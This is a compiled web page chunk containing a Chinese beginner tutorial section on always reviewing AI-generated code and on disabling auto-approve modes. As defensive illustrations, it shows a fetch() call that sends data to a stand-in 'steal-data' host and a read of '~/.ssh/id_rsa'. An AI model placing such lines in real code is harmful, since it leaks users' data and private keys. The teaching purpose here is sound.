import{_ as a,c as i,o as t,a3 as n}from"./chunks/framework.CUcrqFol.js";const c=JSON.parse('{"title":"5.3.6 永远审查代码","description":"5.3.6 永远审查代码：最重要的安全习惯 经过本节学习，你将了解： 为什么代码审查如此重要 如何审查你不完全理解的代码 关于\\"自动批准模式\\"的建议 建立可持续的审查习惯 令人担忧的数据 根据 2025 年的开发者调查： 只有 **67%** 的开发者在部署前审查代码 超过 **40%** 的初学者承认部署了不完全理解","frontmatter":{"title":"5.3.6 永远审查代码","order":8},"headers":[],"relativePath":"Basic/05-advanced/5.3-security/5.3.6-always-review.md","filePath":"Basic/05-advanced/5.3-security/5.3.6-always-review.md","lastUpdated":1765094268000}'),l={name:"Basic/05-advanced/5.3-security/5.3.6-always-review.md"};function e(p,s,h,o,r,d){return t(),i("div",null,[...s[0]||(s[0]=[n(`<h1 id="_5-3-6-永远审查代码-最重要的安全习惯" tabindex="-1">5.3.6 永远审查代码：最重要的安全习惯 <a class="header-anchor" href="#_5-3-6-永远审查代码-最重要的安全习惯" aria-label="Permalink to &quot;5.3.6 永远审查代码：最重要的安全习惯&quot;">​</a></h1><p>经过本节学习，你将了解：</p><ul><li>为什么代码审查如此重要</li><li>如何审查你不完全理解的代码</li><li>关于&quot;自动批准模式&quot;的建议</li><li>建立可持续的审查习惯</li></ul><h2 id="令人担忧的数据" tabindex="-1">令人担忧的数据 <a class="header-anchor" href="#令人担忧的数据" aria-label="Permalink to &quot;令人担忧的数据&quot;">​</a></h2><p>根据 2025 年的开发者调查：</p><ul><li>只有 <strong>67%</strong> 的开发者在部署前审查代码</li><li>超过 <strong>40%</strong> 的初学者承认部署了不完全理解的 AI 生成代码</li><li><strong>33%</strong> 的开发者表示会直接复制粘贴 AI 生成的代码</li></ul><p>这意味着：很多人正在使用他们并不真正理解的代码。</p><h2 id="什么是-真正的-vibe-coding" tabindex="-1">什么是&quot;真正的&quot;Vibe Coding？ <a class="header-anchor" href="#什么是-真正的-vibe-coding" aria-label="Permalink to &quot;什么是&quot;真正的&quot;Vibe Coding？&quot;">​</a></h2><p>Simon Willison（AI 领域知名专家、Django 核心贡献者）对此有一个有趣的观点：</p><blockquote><p>&quot;如果 AI 写了所有代码，但你审查、测试并理解了它，那不是 Vibe Coding——那是用 AI 当打字助手。&quot;</p></blockquote><p>换句话说：</p><table tabindex="0"><thead><tr><th>做法</th><th>类型</th><th>风险</th></tr></thead><tbody><tr><td>AI 生成 → 审查 → 测试 → 部署</td><td>用 AI 辅助开发</td><td>较低</td></tr><tr><td>AI 生成 → 直接部署</td><td>纯 Vibe Coding</td><td>较高</td></tr></tbody></table><p>我们在本教程中倡导的是<strong>有意识的 AI 辅助开发</strong>：充分利用 AI 的能力，但保持人类的判断和审查。</p><h2 id="如何审查你不完全理解的代码" tabindex="-1">如何审查你不完全理解的代码 <a class="header-anchor" href="#如何审查你不完全理解的代码" aria-label="Permalink to &quot;如何审查你不完全理解的代码&quot;">​</a></h2><p>你可能会想：我是初学者，根本看不懂代码，怎么审查？</p><p>好消息是：你不需要完全理解每一行代码，就可以进行有意义的审查。</p><h3 id="检查项一-敏感信息" tabindex="-1">检查项一：敏感信息 <a class="header-anchor" href="#检查项一-敏感信息" aria-label="Permalink to &quot;检查项一：敏感信息&quot;">​</a></h3><p>即使不懂代码，你也能识别这些模式：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 问自己：这里有没有看起来像密钥的东西？</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> key</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;sk-abc123...&quot;</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 这看起来像密钥</span></span>
<span class="line"><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;">const</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> key</span><span style="--shiki-light:#D73A49;--shiki-dark:#F97583;"> =</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;"> process.env.</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;">KEY</span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">  // 这是正确的方式</span></span></code></pre></div><h3 id="检查项二-可疑的网络请求" tabindex="-1">检查项二：可疑的网络请求 <a class="header-anchor" href="#检查项二-可疑的网络请求" aria-label="Permalink to &quot;检查项二：可疑的网络请求&quot;">​</a></h3><p>留意代码是否在向你不认识的地址发送数据：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 问自己：这个网址是我知道的服务吗？</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;https://api.openai.com/...&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)  </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 正常，OpenAI 官方</span></span>
<span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">fetch</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;https://random-site.xyz/steal-data&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)  </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 可疑</span></span></code></pre></div><h3 id="检查项三-文件操作" tabindex="-1">检查项三：文件操作 <a class="header-anchor" href="#检查项三-文件操作" aria-label="Permalink to &quot;检查项三：文件操作&quot;">​</a></h3><p>注意代码是否在读写文件，特别是敏感路径：</p><div class="language-javascript vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">javascript</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 问自己：为什么要读取这些文件？</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">fs.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">readFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;~/.ssh/id_rsa&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)  </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 危险！在读取 SSH 私钥</span></span>
<span class="line"><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">fs.</span><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">readFile</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">(</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;">&quot;./data.json&quot;</span><span style="--shiki-light:#24292E;--shiki-dark:#E1E4E8;">)    </span><span style="--shiki-light:#6A737D;--shiki-dark:#6A737D;">// 正常，读取项目内的数据</span></span></code></pre></div><h3 id="检查项四-让-ai-帮你审查" tabindex="-1">检查项四：让 AI 帮你审查 <a class="header-anchor" href="#检查项四-让-ai-帮你审查" aria-label="Permalink to &quot;检查项四：让 AI 帮你审查&quot;">​</a></h3><p>你可以让另一个 AI（或同一个 AI）来检查代码：</p><div class="language- vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang"></span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span>请审查以下代码，检查是否有：</span></span>
<span class="line"><span>1. 硬编码的密钥或密码</span></span>
<span class="line"><span>2. 可疑的网络请求</span></span>
<span class="line"><span>3. 不安全的文件操作</span></span>
<span class="line"><span>4. 其他安全隐患</span></span>
<span class="line"><span></span></span>
<span class="line"><span>[粘贴代码]</span></span></code></pre></div><div class="tip custom-block"><p class="custom-block-title">技巧</p><p>用一个 AI 来审查另一个 AI 的代码，可以发现一些明显的问题。但这不能替代你自己的判断。</p></div><h2 id="关闭自动批准模式" tabindex="-1">关闭自动批准模式 <a class="header-anchor" href="#关闭自动批准模式" aria-label="Permalink to &quot;关闭自动批准模式&quot;">​</a></h2><p>一些 AI IDE 提供了&quot;自动批准&quot;或&quot;Yolo 模式&quot;，允许 AI 不经你确认就执行命令或修改文件。</p><p><strong>初学者应该关闭此功能。</strong></p><p>原因：</p><ol><li>你需要看到 AI 在做什么，才能学习</li><li>AI 可能做出你不想要的更改</li><li>如果出错，你无法及时阻止</li></ol><p>每个操作都手动确认，虽然慢一点，但更安全，也能帮助你理解发生了什么。</p><h2 id="建立可持续的审查习惯" tabindex="-1">建立可持续的审查习惯 <a class="header-anchor" href="#建立可持续的审查习惯" aria-label="Permalink to &quot;建立可持续的审查习惯&quot;">​</a></h2><p>代码审查不需要花很多时间。建立以下习惯：</p><p><strong>每次 AI 生成代码后</strong>：</p><ul><li>[ ] 快速扫一眼，有没有看起来像密钥的字符串</li><li>[ ] 如果有网络请求，确认目标地址是你知道的</li><li>[ ] 如果看不懂某段代码在做什么，问 AI 解释</li></ul><p><strong>每次准备提交/部署前</strong>：</p><ul><li>[ ] 运行安全检查清单（5.3.4 节）</li><li>[ ] 确认 .env 文件没有被包含</li></ul><p><strong>定期回顾</strong>：</p><ul><li>[ ] 检查项目依赖是否需要更新</li><li>[ ] 确认没有新的安全警告</li></ul><h2 id="记住这个原则" tabindex="-1">记住这个原则 <a class="header-anchor" href="#记住这个原则" aria-label="Permalink to &quot;记住这个原则&quot;">​</a></h2><div class="warning custom-block"><p class="custom-block-title">核心原则</p><p><strong>AI 生成的代码，最终责任在你。</strong></p><p>这不是为了吓你，而是提醒你：保持审查习惯，是保护自己的最好方式。</p></div><p>→ <a href="./5.3.7-summary.html">5.3.7 本节要点总结</a></p>`,46)])])}const u=a(l,[["render",e]]);export{c as __pageData,u as default};
